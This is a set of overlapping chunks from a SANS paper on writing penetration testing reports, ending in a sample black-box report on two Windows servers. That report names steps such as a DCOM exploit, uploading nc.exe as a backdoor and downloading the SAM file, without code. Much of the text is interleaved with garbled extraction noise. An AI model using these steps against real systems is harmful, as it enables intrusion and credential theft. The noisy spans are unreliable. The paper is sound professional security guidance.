responsibilities do not stop when the test is done, however. After the test is completed, you should perform due diligence to ensure the confidentiality of the test results. Some penetration testing firms have known to circulate test results to other companies as samples of their work. These results contain detailed steps on how to break into an e-finance website for a particular financial institution and collect sensitive customer data. You can imagine the shock of the institution when it discovered these contents being distributed to its competitors! Therefore, as a penetration tester, you are under an ethical obligation to keep the details of the report confidential. Shred any hard )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# R( ! ( ! copies of the report, and delete all soft copies using an erasing utility such as PGP or ! ! Axcrypt'. ! ! 2.2. Information Collection ! ! Due to the nature of penetrating testing and utilizing more than one way, tools, ! ! computers, etc., penetration tester needs to make sure that he collected all the information ! in all stages, system used and tools. This will ease his report writing and make all ! information that he need available either in each stage, moving to the next stage, using ! ! information and analyzing it either in the penetration testing activity or during report ! writing. In case of the penetration testing is conducted by a team, a centralized and secure ! ! location need to be located to share the information. ! Collecting the information during the penetration testing stages/steps is a very ! ! important step to be able to write the report. This include, scanning results, vulnerability ! assessment, snap shots of the findings and exploits (if any), etc. Pen-tester needs to ! ! consider information collection in all steps that he performs during the test. Pen testers ! may utilize some tools such as: ! \"#$!%&'(#)*)&'! +!,T!-a.k/in0g!. n-o1te2s! 1 .03!0045!.567!5895!.467!:;83!-/;0!383;! ! Capturing",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 3
    }
  },
  {
    "text": "include, scanning results, vulnerability ! assessment, snap shots of the findings and exploits (if any), etc. Pen-tester needs to ! ! consider information collection in all steps that he performs during the test. Pen testers ! may utilize some tools such as: ! \"#$!%&'(#)*)&'! +!,T!-a.k/in0g!. n-o1te2s! 1 .03!0045!.567!5895!.467!:;83!-/;0!383;! ! Capturing screenshots ! Logging for all activities (This will help in a very critical infrastructure to proof what the pen-tester did and in case something happened). In Linux environment to capture all traffic this command will help: # tcpdump –nn –S 0 –w filename.pcap 2.3. Writing the first draft Start writing a rough draft report using all relevant information gathered in stage 2.2 using the relevant notes. At this stage, it is highly recommended not to be concerned about proofreading and editing. Typically, 60% of report writing time will be in writing the draft. It may be helpful to use a symbol such as \"#\" or adding highlights to mark the spot where pen-tester needs to check back later to edit a paragraph. Delete the symbol once editing is completed. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# S( ! ( ! 2.4. Review and finalization ! ! Draft needs to be reviewed to enhance it, peer review is highly recommended to have ! ! a second opinion. In case the penetration testing has been conducted by a team, all team ! members need to review and/or edit it. Peer review depends on the type of penetration ! ! testing conducted, if it is a black box penetration testing, one of the penetration testing ! team needs to review the report. If the test is white penetration testing, someone with ! ! knowledge of the target system will review the report collaboratively. This will lead to ! much better results. Report review depends also on the organization's procedure and the ! ! way that they handle the service. After updating the report, QA team may also need to ! review it and make sure it follows the company standards. ! ! ! 3. Report Format ! ! ! This section describes the penetration testing report format and why we need each ! subsection. Sample Penetration testing report using the report format described here is ! ! shown in Appendix A. \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! 3.1. Page design In report planning, page design needs to be decided upon to develop the look and feel of the report. This includes but not limited to the header and footer content, fonts to be used and colors. This will be controlled based on how the service provider's document looks and feels. 3.2. Document Control Document control will be based on the service provider control of document procedure. Here are some recommended sections and contents. Cover Page This will show the report name, report version, date, the author/service provider name, cover page may also include document serial number and target organization name. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! !",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 4
    }
  },
  {
    "text": "control of document procedure. Here are some recommended sections and contents. Cover Page This will show the report name, report version, date, the author/service provider name, cover page may also include document serial number and target organization name. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# T( ! ( ! Document Properties ! ! In a small table, this will show the document title, version, author, ! penetration testers name, name of persons whom reviewed the report, ! ! approved by whom and the document classification. ! ! Version control ! This will show the Version Control for the report. Version control ! ! will track the report changes by recording the change description, report ! version, date of the change and the change author. ! ! ! 3.3. List of Report Content ! ! Table of Content ! This will list all sections of the report in a sequence with the page ! ! numbers. Typically, for reports with less than 5 pages, a content page is ! not necessary. If the report includes some appendices, the titles of these ! ! should be listed but not page numbered. ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! List of Illustrations If there are tables or charts included in the report, list them in this section with page numbers. 3.4. Executive Summary \"Write this after you’ve completed writing the report. Think of what you’d say if you ran into an executive in the elevator and had one minute to summarize your findings\" (Snedaker, 2006). The Executive Summary summarizes the report content in a small paragraph containing a statement of the tasks accomplished, methodology used, high level findings and recommendations. Executive summery target executives where high level findings/issues need to be raised and recommended solutions need to be presented. This section normally is written after writing the report. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @?( ! ( ! Scope of work ! ! Scope of work clearly identifies the scope of the project, IP ! addresses that has been tested, type of penetration testing perform and any ! ! other information that affect the time and budget of the project. ! Identifying the scope will help ! ! Project Objectives ! ! Provide the objectives that the organization will gain after knowing ! the risks related to the penetration of the target IP addresses/ system or ! ! application and what they will get after mitigating these risks by ! implementing the recommendations in the penetration testing report. ! ! The penetration testing objective needs to be linked with the ! information security objectives, which are expected to be linked with the ! ! organization's objectives. ! If the penetration testing is part of compliance project the report ! ! needs to mention this requirement and how the pen-testing will help to ! achieve it. \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Assumption In case there are some assumptions that the pen-tester considers before or during the test, the assumptions need",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 5
    }
  },
  {
    "text": "objectives. ! If the penetration testing is part of compliance project the report ! ! needs to mention this requirement and how the pen-testing will help to ! achieve it. \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Assumption In case there are some assumptions that the pen-tester considers before or during the test, the assumptions need to be clearly shown in the report. Providing the assumption will help the report audiences to understand why penetration testing followed a specific direction. Timeline This will show the penetration testing start and end dates. This will provide the report target audiences with information about: 1- Testing duration 2- The tested IP address's risks, from pen-testing point of view, during this period only. 3- The pen-tester does not hold any responsibilities if some risk aroused after this period of time due to some changes in the target systems. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @@( ! ( ! Summary of Findings ! ! In a glance view show the number of discovered risks based on ! priorities. \"When you construct the report of your findings, be careful to ! ! avoid statements that are inflammatory, unsupported by the evidence, ! speculative, or overly frightening.\" (Smith et al, 2004). ! ! Summary of Recommendation ! ! Based on the analysis of risks and the high level finding, the high ! level recommendation for the target organization need to be described. ! ! ! 3.5. Methodology ! ! This section provides the needed information about how the penetration testing was ! conducted. What steps have been followed to collect the information, analyze them, the ! ! risk rating methodology used to calculate the risk for each piece of vulnerability and it ! may also contain the tools that the pen-tester used for each stage. ! ! 3.6. Detail findings ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! This section provides detailed information for each finding. Present the findings in the simplest way as possible. For each finding describe the threat level, vulnerability rating, analysis of the issue and the impact on the information asset (the IP address) if the threat agent was able to exploit the vulnerability, Risk Rating and Recommendation. Each one of these elements will be briefed in the next paragraphs. There are a number of ways in which results can be presented. Here are a few: • Tables • Graphs • Pie or Bar charts • Diagrams Vulnerabilities For each piece of vulnerability, a clear description should be shown about the source of the vulnerability, its impact and the likelihoods of the vulnerability to be exploited. Report should explain the source of the vulnerability and the root )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @>( ! ( ! cause of the problem not the symptom of it. This will mitigate the vulnerability ! ! persistence. ! Impact ! ! The report should explain the impact of the vulnerability's exploitation by ! the threat agent. ! ! Likelihood ! Likelihood is \"the probability",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 6
    }
  },
  {
    "text": "! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @>( ! ( ! cause of the problem not the symptom of it. This will mitigate the vulnerability ! ! persistence. ! Impact ! ! The report should explain the impact of the vulnerability's exploitation by ! the threat agent. ! ! Likelihood ! Likelihood is \"the probability that a potential vulnerability may be ! ! exercised within the construct of the associated threat environment\" (Stoneburner, ! Goguen1, & Feringa1, 2002). The report should state the likelihood of a ! ! vulnerability being exploited by the threat source (e.g. a hacker). Practical ! penetration tester may think of the likelihood as a combination of ease of access, ! level of access gained, difficulty of discovering the vulnerability and exploiting it, ! ! and the value of the asset to the target organization. ! Risk evaluation ! ! \"Process of comparing the estimated risk against given risk criteria to ! determine the significance of the risk \"(ISO/IEC Guide 73:2002). Table 3 Risk ! \"#$A!%n&a'l(y#s)is* i)n&' A+!p,p!-en.d/i0x! .A- w12a!s1 d.e0v3e!l0o0p4ed5 !b.a5se6d7 o!5n8 N9I5S!T.4. 67!:;83!-/;0!383;! This is a Special Publication 800-30, which shows one method of risk analysis and calculation. Recommendation \"Presenting a piece of vulnerability in your findings without documenting how the vulnerability could be managed is only half of your security assessment job. The other half is presenting potential solutions, mitigations, or other suggestions for reducing or eliminating the vulnerability.\" (Smith et al., 2004). Based on the risk rating and the target asset, the penetration tester should provide an acceptable recommendation with alternatives. For example, for weak authentication protocols being used to validate accounts for accessing a customer database through the ASP Web application, pen tester may provide more than option for mitigating the risk such as: 1-Implement Public Key Infrastructure (PKI) by providing certificate to all users of the database and require certificate-based authentication on the front-end )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @O( ! ( ! website in addition to the forms-based authentication on the website. This solution ! ! will require the design and implementation of a PKI and Active Directory. ! Additionally, all client operating systems must run Microsoft Windows 2000 or ! ! later. ! 2- Import the accounts database to Active Directory and implement basic ! ! authentication over SSL on the website. This solution will require the design and ! implementation of Active Directory. ! ! 3-Continue to use the current custom authentication protocol, which is highly ! susceptible to spoofing or man-in-the-middle attacks. ! ! Penetration Tester may also utilize Annex A - Control objectives and controls ! ISO/IEC 27001:2005 to select some controls that will help in minimizing the risk ! discovered. ! ! ! 3.7. References ! ! It is important to give precise details of all the work by other authors, which has been ! referred to within the report. Details should include: ! \"#$!%&'(#)*)&'+!,•!- A.u/t0ho!.r-’s1 n2a!1m.e0 a3n!0d 0in4i5ti!a.l5s 67!5895!.467!:;83!-/;0!383;! • Date of publication • Title of the book, paper or",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 7
    }
  },
  {
    "text": "! ! 3.7. References ! ! It is important to give precise details of all the work by other authors, which has been ! referred to within the report. Details should include: ! \"#$!%&'(#)*)&'+!,•!- A.u/t0ho!.r-’s1 n2a!1m.e0 a3n!0d 0in4i5ti!a.l5s 67!5895!.467!:;83!-/;0!383;! • Date of publication • Title of the book, paper or journal • Publisher • Place of publication • Page numbers • Details of the journal volume in which the article has appeared. References should be listed in alphabetical order of the authors' names. Make sure that your references are accurate and comprehensive. 3.8. Appendices An appendix contains additional information related to the report but which is not essential to the main findings. This can be consulted if the reader wishes to but the report should not depend on this. Such information may include the scanning result, vulnerability assessment results, or other information, which may be useful for the reader. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @P( ! ( ! 3.9. Glossary ! ! Define the meaning of technical terms. ! ! ! Appendix A shows a Sample report of a penetration testing. ! ! ! ! 4. References ! ! Whitaker, A., & Newman, D. (2005). Penetration testing and network defense. USA: ! Cisco Press. ! ! ! Smith, B., LeBlanc, D., & Lam , K. (2004). Assessing network security. USA: ! ! Microsoft Press. ! ! ! Snedaker , S.(2006). It Security project management . Canada: Syngress. ! ISO (the International Organization for Standardization) and IEC (the International ! ! Electro-technical (2005). Information security management systems — Requirements \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! BS ISO/IEC 27001:2005. International Organization for Standardization. ( C$%2<,%+1(!-(U>??OV-(!\"#$%&'(\"#)\"*+',$+-%../+./+01&)\"$&&+2.\"2$-'-(M:&#$('( )\"&6%5$(W\",0+:,,(X5$%%.- ( X#%+:/\"&+:&1(Y-1 Feringa1!-1(Z(Y%4\":+1(!-(U>??>V-(3456+5-$2)(7+-107)2(').\"+899:;9+ %)&<+=(\"(*$=$\"'+*1)#$+/.%+)\"/.%=(').\"+'$2,\".7.*>+&>&'$=&+%$2.==$\"#(').\"&+./+ ',$+\"(').\"(7+)\"&')'1'$+./+&'(\"#(%#&+(\"#+'$2,\".7.*>-(Y*0#$:&,/\"&4'([*#0%+*.((( \\+,#0#\"#:(%J(X#*+6*&6,(*+6(C:5$+%.%4H-( Retrieved December 15,2009 from NIST Web site: http://csrc.nist.gov/publications/nistpubs/800-30/sp800-30.pdf The Higher Education Academy. Writing Reports Retrieved December 15,2009 from The Higher Education Academy Web site: )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @Q( ! ( ! http://www.heacademy.ac.uk/assets/hlst/documents/heinfe_exchange/Blended_Learni ! ! ng_PDP_Materials/5_reportwriting.pdf ! ! ! The University of Wisconsin, Writer's Handbook ! Retrieved December 15,2009, from University of Wisconsin Web site: ! ! http://writing.wisc.edu/Handbook/ ! ! ! Purdue Online Writing Lab, Handbook on report Formats ! Retrieved January 10.2010, from Purdue OWL and Writing Lab Web site: ! ! http://owl.english.purdue.edu/owl/resource/726/01/ ! ! ! ]KJ%&61(?@/.%#+$\"*7)&,+#)2').\"(%>-([:D(^%&B'(]KJ%&6(_+07:&,0#H(M&:,,- ! ! CQ University Australia, Communications Learning Centre ! ! Retrieved December 15, 2009, from CQ University Australia Website: ! http://clc.cqu.edu.au/FCWViewer/view.do?page=842 ! \"#$!%&'(#) *)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! The SANS Institute. (2009). SANS Security 560 Network Penetration Testing and Ethical Hacking. The SANS Institute. Payment Card Industry PCI. (2008). Information supplement: requirement 11.3 penetration testing. PCI Security Standards Council, 11.3. Retrieved January 10.2010, from Payment Card Industry (PCI) Web site: https://www.pcisecuritystandards.org/pdfs/infosupp_11_3_penetration_testing.pdf ( ( )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @=( ! ( ! Appendix A Sample Penetration Testing Report ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! Black Box Penetration Testing ! For GPEN.KM ! !",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 8
    }
  },
  {
    "text": "( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @=( ! ( ! Appendix A Sample Penetration Testing Report ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! Black Box Penetration Testing ! For GPEN.KM ! ! V1.0 ! Month ddth, yyyy \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! By: Mansour A. Alharbi )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @R( ! ( ! ! ! ! Document Properties ! ! ! ! Title Black Box Penetration Testing Report ! ! Version V1.0 ! Author Mansour A. Alharbi ! ! Pen-testers Mansour A. Alharbi ! ! Reviewed By Kees Leune ! Approved By Kees Leune ! ! Classification Confidential ! ! ! Version control ! ! Version Date Author Description ! V1.0 \"#$!% &M'(o#n)t*h) d&'d+th!,, y!-y.y/y 0!.M-a1n2s!o1u.r0 A3l!0ha0r4b5i !.567F!i5n8al9 D5!r.a4ft6 7!:;83!-/;0!383;! )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @S( ! ( ! ! ! ! Table of Content ! ! CONTENTS ........................................................................................................................18 ! 1EXECUTIVE SUMMARY...................................................................................................20 ! ! 1.1SCOPE OF WORK..........................................................................................................20 ! 1.2PROJECT OBJECTIVES.................................................................................................20 ! ! 1.3ASSUMPTION................................................................................................................20 ! 1.4TIMELINE.....................................................................................................................20 ! ! 1.5SUMMARY OF FINDINGS..............................................................................................21 ! 1.6SUMMARY OF RECOMMENDATION.............................................................................22 ! ! 2METHODOLOGY .............................................................................................................23 ! 2.1PLANNING....................................................................................................................23 ! ! 2.2EXPLOITATION............................................................................................................24 ! 2.3REPORTING..................................................................................................................24 ! ! 3DETAIL FINDINGS ...........................................................................................................25 \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! 3.1DETAILED SYSTEMS INFORMATION............................................................................25 3.2WINDOWS SERVER 192.168.1.75................................................................................27 4.REFERENCES..................................................................................................................32 APPENDIX A NESSUS VULNERABILITY SCANNING REPORTS..........................................32 )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# @T( ! ( ! ! ! ! ! List Of Illustrations ! ! ! List of Tables ! Table 1 Penetration Testing Time Line 12 ! ! Table 1 Total Risk Rating 12 ! ! Table 3 Risk Analysis 16 ! ! Table 4 Rating Calculation 16 ! Table 5 Targets open ports 17 ! ! ! List of Figures ! Figure 1 Total Risks 13 ! ! Figure 2 Penetration Testing Methodology 15 ! ! Figure 3 192.168.1.75 Number of Risks 17 \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Figure 4 Telnet Service Banner 18 Figure 12 Exploiting RPC using dcom 18 Figure 13 Getting Shell Access 19 Figure 14 Exploiting dcom – metasploit 19 Figure 16 Uploading nc.exe as backdoor 21 Figure 17 Shell command and running nc 22 Figure 18 Downloading SAM file 22 )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >?( ! ( ! ! ! ! ! 1. Executive Summary ! ! This document details the security assessment (external penetration testing) of ! GPEN.KM. The purpose of the assessment was to provide a review of the security ! ! posture of GPEN.KM Internet infrastructure, as well, as to identify potential weaknesses ! in its Internet infrastructure. ! ! 1.1. Scope of work ! ! ! This security assessment covers the remote penetration testing of 2 accessible ! servers hosted on 192.168.1.75 and 192.168.1.76 addresses. The assessment was carried ! ! out from a black box perspective, with the only supplied information being the tested ! servers IP addresses. No other information was assumed at the start",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 9
    }
  },
  {
    "text": "security assessment covers the remote penetration testing of 2 accessible ! servers hosted on 192.168.1.75 and 192.168.1.76 addresses. The assessment was carried ! ! out from a black box perspective, with the only supplied information being the tested ! servers IP addresses. No other information was assumed at the start of the assessment. ! ! 1.2. Project Objectives ! ! This security assessment is carried out to gauge the security posture of GPEN.KM’s \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Internet facing hosts. The result of the assessment is then analyzed for vulnerabilities. Given the limited time that is given to perform the assessment, only immediately exploitable services have been tested. The vulnerabilities are assigned a risk rating based on threat, vulnerability and impact. 1.3. Assumption While writing the report, we assume that both IP addresses are considered to be public IP addresses, NDA and rules of engagement has been signed and based on the information gathering phase the company name is GPEN.KM. 1.4. Timeline The timeline of the test is as below: Penetration Testing Start Date/Time End Date/Time Pen Test 1 mm/dd/yyyy mm/dd/yyyy Table 1 Penetration Testing Time Line )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >@( ! ( ! 1.5. Summary of Findings ! ! Number of ! Value ! Risks ! Low 3 ! ! Medium 2 ! High 6 ! ! Critical 6 ! Table 2 Total Risk Rating ! ! ! ! ! ! ! ! ! ! ! ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Figure 1 Total Risks GPEN.KM needs to pay more attention to information security. We were able to access one server in less than one hour. GPEN.KM needs to invest in implementing a defense-in-depth approach to have multiple layers of security to protect their information asset. Other areas such as processes and people should be emphasized as well. Systems and networks hardening and secure configurations, for instance, should be implemented to strengthen the different layers of security within GPEN.KM . Below are the high level findings from the external penetration test: • GPEN.KM lacks a defense in depth (multi-layered) security strategy which if implemented will help GPEN.KM achieves better security level. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >>( ! ( ! • We found that both servers are not protected by a firewall and can present a ! ! security risk since the host runs a number of services such as Microsoft terminal ! services without being configured for optimal security. GPEN.KM must design ! ! the Firewall policy as follows: ! o Apply rules to allow only public services such as mail and web access. ! ! o Apply anti-mapping rules on the border router and primary firewall. ! o Allow only authorized IPs to connect to other services or best disable ! ! unneeded services. ! • It was obvious that GPEN.KM patch management policy and procedure is either ! ! not existing or not implemented correctly. One of these servers was running ! windows 2000",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 10
    }
  },
  {
    "text": "firewall. ! o Allow only authorized IPs to connect to other services or best disable ! ! unneeded services. ! • It was obvious that GPEN.KM patch management policy and procedure is either ! ! not existing or not implemented correctly. One of these servers was running ! windows 2000 server without any patches. This opened a very high security risk ! on the organization. ! ! • Services installed were running with default configuration such as FTP. ! Web application hosted in 192.168.1.75 is running multiple security vulnerability ! ! such as SQL injection and XSS. An attacker can gain access to customer ! information and manipulate it. GPEN.KM has to implement input validation and ! \"#$re!%-&d'e(s#ig)*n )t&h'e+ !w,!e-b. a/p0p!l.ic-a1ti2o!n1 .c0o3m!0po0n4e5n!t.. 5B6e7st! 5p8ra9c5tic!.e4 i6s 7to!: h;a8v3e! -3-/ti;e0r !d3e8s3ig;n!. At least the application server and DB server should be hosted in deferent servers and segregated by a firewall. 1.6. Summary of Recommendation Adopt defense-in-depth approach where GPEN.KM utilizes variety of security tools/systems and processes to protect its assets and information. Among these: • Deploy Host Intrusion Prevention Systems –HIPS on servers and desktops, also enable personal firewall on desktop (such as Microsoft Windows firewall). • Perform security hardening on servers in the production environment especially those in the Internet and/or external DMZs. • Implement Patch management system(s) to provide centralized control over fixes, updates and patches to all systems, devices and equipments. This will minimize overhead on operations team and will elevate security resistance. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >O( ! ( ! • GPEN.KM has to implement input validation and re-design the web ! ! application component. Best practice is to have 3-tier design. At least the ! application server and DB server should be hosted in deferent servers and ! ! segregated by a firewall. ! • Conduct vulnerability assessment at least twice a year and penetration testing ! ! at least once a year or if there is a major change in the information assets. ! • Develop and implement a training path for the current IT staff. ! ! ! 2. Methodology ! ! ! ! ! ! ! ! ! ! ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Figure 2 Penetration Testing Methodology 2.1. Planning During planning we gather information from public sources to learn about target: - People and culture - Technical infrastructure Then, we detect the live system its O.S and determined the running services and its versions. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >P( ! ( ! 2.2. Exploitation ! ! Utilizing the information gathered in Planning we start to find the vulnerability for each ! ! O.S and service that we discovered after that trying to exploit it. ! ! 2.3. Reporting ! ! Based on the results from the first two steps, we start analyzing the results. Our Risk ! ! rating is based on this calculation: ! ! ! Risk=Threat * Vulnerability * Impact ! ! ! Threat Low",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 11
    }
  },
  {
    "text": "discovered after that trying to exploit it. ! ! 2.3. Reporting ! ! Based on the results from the first two steps, we start analyzing the results. Our Risk ! ! rating is based on this calculation: ! ! ! Risk=Threat * Vulnerability * Impact ! ! ! Threat Low Medium High Critical ! ! ! Vulnerability L M H C L M H C L M H C L M H C ! Impact Low 1 2 3 4 1 4 6 8 3 6 9 12 4 8 12 16 ! ! Medium 2 4 6 8 4 8 12 16 6 12 18 24 8 16 24 32 ! High 3 6 9 12 6 12 18 24 9 18 27* 36 12 24 36 48 \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Critical 4 8 12 16 8 16 24 32 12 24 36 48 16 32 48 64 Table 3 Risk Analysis L Low 1-16 M Medium 17-32 H High 33-48 C Critical 49-64 Table 4 Rating Calculation After calculating the risk rating, we start writing the report on each risk and how to mitigate it. *Based on our analysis risks that falls under this category will be considered as High. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >Q( ! ( ! 3. Detail findings ! ! ! 3.1. Detailed Systems Information ! ! Open Ports ! ! IP Address System Type OS Information Service Port# Protocol ! Name ! ! 139 Tcp netbios-ssn ! 21 Tcp ftp ! ! 80 Tcp http ! 135 Tcp Msrpc ! ! 389 Tcp Ldap ! open ! 445 Tcp ! microsoft-ds ! open ! 464 tcp ! kpasswd5? ! open \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!58955!.9436 7!:;8tc3p!- /;0!383;! Microsoft ncacn_http Server Windows Server open 192.168.1.76 636 tcp 2003 Service Pack tcpwrapped 1 1025 Tcp open msrpc open 1027 Tcp ncacn_http 1030 Tcp open msrpc 3268 Tcp open ldap open 3269 Tcp tcpwrapped open microsoft- 3389 Tcp rdp )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >=( ! ( ! 80 Tcp HTTP ! ! 135 Tcp Msrpc ! 139 Tcp netbios-ssn ! ! 443 Tcp HTTPS ! 445 Tcp microsoft-ds ! ! Microsoft 1027 Tcp Port exosee ! Windows 2000 Port ! 192.168.1.75 Server 1035 Tcp Service Pack 0 ! mxxrlogin ! 23 Tcp telnet ! ! 53 Tcp DNS ! Port netinfo- ! 1033 Tcp ! local ! ! 135 Udp Port epmap ! ! Table 5 Targets open ports ! ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >R( ! ( ! 3.2. Windows Server 192.168.1.75 ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! Figure 3 192.168.1.75 Number of Risks ! ! ! Unsecure service (Telnet) is running: ! Threat Level ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Medium Vulnerability Medium Analysis Telnet provides access to the server for remote administration as an example. Unfortunately telnet traffic is not encrypted. Suspicious users i.e.",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 12
    }
  },
  {
